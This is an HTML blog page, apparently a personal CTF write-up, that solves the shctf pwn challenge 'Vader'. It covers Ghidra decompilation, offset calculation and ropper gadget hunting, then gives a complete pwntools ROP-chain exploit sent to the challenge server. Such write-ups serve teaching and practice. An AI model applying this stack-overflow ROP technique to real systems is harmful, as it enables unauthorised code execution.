@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="theme-color" content="#82C4E4">
+    
+    
+
+    <meta name="description" content="Writeup for the shctf pwn challenge &quot;Vader&quot;.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shctf&#x2F;pwn: Vader">
+<meta property="og:url" content="https://enscribe.dev/ctfs/shctf/pwn/vader/index.html">
+<meta property="og:site_name" content="enscribe.dev">
+<meta property="og:description" content="Writeup for the shctf pwn challenge &quot;Vader&quot;.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://enscribe.dev/asset/banner/banner-ctfs.png">
+<meta property="article:published_time" content="2022-06-07T17:41:26.000Z">
+<meta property="article:modified_time" content="2022-06-07T20:23:58.356Z">
+<meta property="article:author" content="jktrn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="shctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://enscribe.dev/asset/banner/banner-ctfs.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/71956291?v=4">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/71956291?v=4" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/71956291?v=4">
+        
+      
+    
+    <!-- title -->
+    <title>shctf/pwn: Vader</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Jason&#39;s Space 🐳" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">~/</a></li><!--
+     --><!--
+       --><li><a href="/articles/">~/articles</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">~/ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">~/profiles</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="next post" href="/ctfs/pico22/pwn/buffer-overflow-0-1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">previous post</span>
+      <span id="i-next" class="info" style="display:none;">next post</span>
+      <span id="i-top" class="info" style="display:none;">back to top</span>
+      <span id="i-share" class="info" style="display:none;">share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/ctfs/shctf/pwn/vader/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&text=shctf/pwn: Vader"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&is_video=false&description=shctf/pwn: Vader"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=shctf/pwn: Vader&body=Check out this article: https://enscribe.dev/ctfs/shctf/pwn/vader/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&name=shctf/pwn: Vader&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://enscribe.dev/ctfs/shctf/pwn/vader/&t=shctf/pwn: Vader"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        shctf/pwn: Vader
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jktrn</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-07T17:41:26.000Z" itemprop="datePublished">June 7, 2022</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/shctf/" rel="tag">shctf</a>
+    </div>
+
+ <br>
+      <i class="fas fa-clock"></i> 8 min. read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <style>
+    .box {
+        border: 1px solid rgba(100, 100, 100, .5);
+        padding: 1rem;
+        font-size: 90%;
+        text-align: center;
+    }
+    .flex-container {
+        display: flex;
+        flex-wrap: nowrap;
+        justify-content: center;
+    }
+</style>
+
+<p class="box">
+Submit flag from <code>/flag.txt</code> from <code>0.cloud.chals.io:20712</code><br>
+<b>Author</b>: v10l3nt<br>
+<b>Files</b>: <a href="/asset/shctf/vader">vader</a>
+</p>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/kali/ctfs/shctf/pwn/vader/vader&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>As with any binary-only challenge, the first thing we must do is boot it up in the <strong>Ghidra</strong> disassembler. Looking through the code we can check what our main function does:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> local_28 [<span class="number">32</span>];</span><br><span class="line">  </span><br><span class="line">  print_darth();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nWhen I left you, I was but the learner. Now I am the master &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(local_28,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Looks like it reads our input (<code>stdin</code>) with a fixed length (256) through <code>fgets()</code>. Let’s continue sifting around:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vader</span><span class="params">(<span class="type">char</span> *param_1,<span class="type">char</span> *param_2,<span class="type">char</span> *param_3,<span class="type">char</span> *param_4,<span class="type">char</span> *param_5)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  FILE *local_10;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(param_1,<span class="string">&quot;DARK&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_2,<span class="string">&quot;S1D3&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(param_3,<span class="string">&quot;OF&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(param_4,<span class="string">&quot;TH3&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(param_5,<span class="string">&quot;FORC3&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">            local_38 = <span class="number">0</span>;</span><br><span class="line">            local_30 = <span class="number">0</span>;</span><br><span class="line">            local_28 = <span class="number">0</span>;</span><br><span class="line">            local_20 = <span class="number">0</span>;</span><br><span class="line">            local_10 = (FILE *)<span class="number">0x0</span>;</span><br><span class="line">            local_10 = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            fgets((<span class="type">char</span> *)&amp;local_38,<span class="number">0x30</span>,local_10);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;&lt;&lt; %s\n&quot;</span>,&amp;local_38);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;You are a wretched thing, of weakness and fear.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The goal is now clear: call the <code>vader()</code> function with five correct arguments to print the flag. Simple, right? Let’s start building our chain.</p>
+<p>Firstly, we need to calculate our <strong>offset</strong>. Although we can brute this by simply pasing a <code>cyclic</code> string and seeing what’s overwritten the <code>$rsp</code> register, we can see that in the <code>main()</code> function, 32 bytes are allocated to <code>char local_28</code>. If we add 8 bytes to cover the <code>$rbp</code> register, our offset is 40.</p>
+<p>Next in line is the process of getting our arguments on the stack. Arguments to be passed into functions are held in <strong>registers</strong> – since this is a 64-bit binary, we need to figure out which ones we need to use to pass the correct arguments (<code>DARK</code>, <code>S1D3</code>, <code>OF</code>, <code>TH3</code>, <code>FORC3</code>) into <code>vader()</code>. Referencing <a target="_blank" rel="noopener" href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">this x64 cheatsheet</a>:</p>
+<blockquote>
+<p>To call a function, the program should place the first six integer or pointer parameters in the registers $rdi, $rsi, $rdx, $rcx, $r8, and $r9; subsequent parameters (or parameters larger than 64 bits) should be pushed onto the stack, with the first argument topmost. The program should then execute the call instruction, which will push the return address onto the stack and jump to the start of the specified function.</p>
+</blockquote>
+<p>Therefore, we need to put our arguments into <code>$rdi</code>, <code>$rsi</code>, <code>$rdx</code>, <code>$rcx</code>, and <code>$r8</code>. The main method of doing this is via <strong>gadgets</strong>, or simple assembly instructions that can be used to <code>pop</code> specific registers from the stack. After the <code>pop</code>, we can repopulate the register with our own address that represents the required string (this address will be located within the binary). Additionally, they almost always have a <code>ret</code> instruction at the end to return to <em>even more</em> gadgets, therefore creating a <strong>ROP chain</strong>.</p>
+<p><strong>Note</strong>: The program literally provides gadget functions for you:</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">00000000004011c9</span> <span class="string">&lt;gadget1&gt;:</span></span><br><span class="line">  <span class="attr">4011c9</span>: <span class="string">55                    push   rbp</span></span><br><span class="line">  <span class="attr">4011ca</span>: <span class="string">48 89 e5              mov    rbp,rsp</span></span><br><span class="line">  <span class="attr">4011cd</span>: <span class="string">59                    pop    rcx</span></span><br><span class="line">  <span class="attr">4011ce</span>: <span class="string">5a                    pop    rdx</span></span><br><span class="line">  <span class="attr">4011cf</span>: <span class="string">c3                    ret    </span></span><br><span class="line">  <span class="attr">4011d0</span>: <span class="string">90                    nop</span></span><br><span class="line">  <span class="attr">4011d1</span>: <span class="string">5d                    pop    rbp</span></span><br><span class="line">  <span class="attr">4011d2</span>: <span class="string">c3                    ret    </span></span><br><span class="line"></span><br><span class="line"><span class="attr">00000000004011d3</span> <span class="string">&lt;gadget2&gt;:</span></span><br><span class="line">  <span class="attr">4011d3</span>: <span class="string">55                    push   rbp</span></span><br><span class="line">  <span class="attr">4011d4</span>: <span class="string">48 89 e5              mov    rbp,rsp</span></span><br><span class="line">  <span class="attr">4011d7</span>: <span class="string">41 59                 pop    r9</span></span><br><span class="line">  <span class="attr">4011d9</span>: <span class="string">41 58                 pop    r8</span></span><br><span class="line">  <span class="attr">4011db</span>: <span class="string">c3                    ret    </span></span><br><span class="line">  <span class="attr">4011dc</span>: <span class="string">90                    nop</span></span><br><span class="line">  <span class="attr">4011dd</span>: <span class="string">5d                    pop    rbp</span></span><br><span class="line">  <span class="attr">4011de</span>: <span class="string">c3                    ret    </span></span><br></pre></td></tr></table></figure>
+
+<p>Although you can use these, it’s not really in the nature of a ROP challenge, so I will be finding the gadgets manually!</p>
+<p>To find the gadgets we need, we will be utilizing a program called <code>ropper</code> and <code>grep</code>-ing the output:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">root@kali~$ </span><span class="language-bash">ropper -f vader | grep <span class="string">&quot;rdi&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0x000000000040145e</span>: <span class="string">add byte ptr [rax], al; mov rdi, rax; call 0x1030; nop; pop rbp; ret; </span></span><br><span class="line"><span class="attr">0x00000000004011bc</span>: <span class="string">add byte ptr [rax], al; mov rdi, rax; call 0x1040; nop; pop rbp; ret; </span></span><br><span class="line"><span class="attr">0x00000000004015e9</span>: <span class="string">add byte ptr [rax], al; mov rdi, rax; call 0x1060; mov eax, 0; leave; ret; </span></span><br><span class="line"><span class="attr">0x00000000004010b7</span>: <span class="string">mov ecx, 0x401600; mov rdi, 0x4015b5; call qword ptr [rip + 0x3f26]; hlt; nop dword ptr [rax + rax]; ret; </span></span><br><span class="line"><span class="attr">0x00000000004010b6</span>: <span class="string">mov rcx, 0x401600; mov rdi, 0x4015b5; call qword ptr [rip + 0x3f26]; hlt; nop dword ptr [rax + rax]; ret; </span></span><br><span class="line"><span class="attr">0x00000000004010bd</span>: <span class="string">mov rdi, 0x4015b5; call qword ptr [rip + 0x3f26]; hlt; nop dword ptr [rax + rax]; ret; </span></span><br><span class="line"><span class="attr">0x0000000000401460</span>: <span class="string">mov rdi, rax; call 0x1030; nop; pop rbp; ret; </span></span><br><span class="line"><span class="attr">0x00000000004011be</span>: <span class="string">mov rdi, rax; call 0x1040; nop; pop rbp; ret; </span></span><br><span class="line"><span class="attr">0x00000000004015eb</span>: <span class="string">mov rdi, rax; call 0x1060; mov eax, 0; leave; ret; </span></span><br><span class="line"><span class="attr">0x00000000004010f6</span>: <span class="string">or dword ptr [rdi + 0x405060], edi; jmp rax; </span></span><br><span class="line"><span class="attr">0x000000000040165b</span>: <span class="string">pop rdi; ret; </span></span><br></pre></td></tr></table></figure>
+
+<p>Check it out – on line 14 (<code>0x40165b</code>) there’s a perfect gadget for us to use! Let’s find ones for the rest of them:</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0x0000000000401659</span>: <span class="string">pop rsi; pop r15; ret;</span></span><br><span class="line"><span class="attr">0x00000000004011ce</span>: <span class="string">pop rdx; ret; </span></span><br><span class="line"><span class="attr">0x00000000004011d8</span>: <span class="string">pop rcx; pop r8; ret; </span></span><br></pre></td></tr></table></figure>
+
+<p>The first <code>pop rsi; pop r15;</code> isn’t ideal, as it’s popping a redundant register – we’ll need to repopulate it with 8 bytes of garbage. On the other hand, the <code>pop rcx; pop r8;</code> takes care of two registers at once!</p>
+<p>With that, we can draw up a visual of what our final payload will look like:</p>
+<p><img src="/asset/shctf/payload-visual.png" alt="Payload Visual"></p>
+<p>The last thing we need to do is to find the hex addresses of our argument strings:</p>
+<img src="/asset/shctf/strings.png">
+<center><sub>String data in Ghidra</sub></center>
+
+<p>Don’t forget the address of <code>vader()</code> too!:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x vader</span><br><span class="line">0x40146b &lt;vader&gt;: 0xe5894855</span><br></pre></td></tr></table></figure>
+
+<p>Here is my final script, which defines a variable for each section of our gigantic payload – this is for enhanced readability. I’ve also used the <code>p64()</code> function, which converts the address into little endian:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset =        <span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>         <span class="comment"># OVERFLOWING 32 + 8 BYTES FOR $RBP</span></span><br><span class="line"></span><br><span class="line">rdi =           p64(<span class="number">0x0040165b</span>) <span class="comment"># RDI, RSI, RDX, RCX, &amp; R8 ARE ARGS REGISTERS</span></span><br><span class="line">rsi_r15 =       p64(<span class="number">0x00401659</span>)</span><br><span class="line">rdx =           p64(<span class="number">0x004011ce</span>)</span><br><span class="line">rcx_r8 =        p64(<span class="number">0x004011d8</span>)</span><br><span class="line"></span><br><span class="line">dark =          p64(<span class="number">0x00402ec9</span>) <span class="comment"># ADDRESSES FOR STRINGS IN THE BINARY</span></span><br><span class="line">side =          p64(<span class="number">0x00402ece</span>)</span><br><span class="line">r15_garbage =   p64(<span class="number">0xCAFEBEEF</span>) <span class="comment"># GARBAGE</span></span><br><span class="line">of =            p64(<span class="number">0x00402ed3</span>)</span><br><span class="line">the =           p64(<span class="number">0x00402ed6</span>)</span><br><span class="line">force =         p64(<span class="number">0x00402eda</span>)</span><br><span class="line"></span><br><span class="line">vader =         p64(<span class="number">0x0040146b</span>)</span><br><span class="line"></span><br><span class="line">payload = offset</span><br><span class="line">payload += rdi + dark                   <span class="comment"># POP RDI, STORING &quot;DARK&quot;</span></span><br><span class="line">payload += rsi_r15 + side + r15_garbage <span class="comment"># POP RSI &amp; R15, STORE &quot;S1D3&quot; + GARBAGE</span></span><br><span class="line">payload += rdx + of                     <span class="comment"># POP RDX, STORING &quot;OF&quot;</span></span><br><span class="line">payload += rcx_r8 + the + force         <span class="comment"># POP RCX &amp; R8, STORING &quot;TH3&quot; + &quot;FORC3&quot;</span></span><br><span class="line">payload += vader                        <span class="comment"># ADDRESS OF VADER</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">20712</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">log.success(p.recvallS())</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p>This is considered a “simple” challenge for those experienced with the field of return-oriented programming within pwn&#x2F;binary challenges. However, I had none prior to this competition, so <kbd>Vader</kbd> was one of the most time-consuming and annoying challenges to work with. Yet, it was probably the most satisfying solve throughout the entire competition, and it was my first time utilizing gadgets and building a ROP chain. I hope you enjoyed!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">~/</a></li>
+         
+          <li><a href="/articles/">~/articles</a></li>
+         
+          <li><a href="/ctfs/">~/ctfs</a></li>
+         
+          <li><a href="/profiles/">~/profiles</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/ctfs/shctf/pwn/vader/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&text=shctf/pwn: Vader"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&is_video=false&description=shctf/pwn: Vader"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=shctf/pwn: Vader&body=Check out this article: https://enscribe.dev/ctfs/shctf/pwn/vader/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&title=shctf/pwn: Vader"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/ctfs/shctf/pwn/vader/&name=shctf/pwn: Vader&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://enscribe.dev/ctfs/shctf/pwn/vader/&t=shctf/pwn: Vader"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    jktrn
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">~/</a></li><!--
+     --><!--
+       --><li><a href="/articles/">~/articles</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">~/ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">~/profiles</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
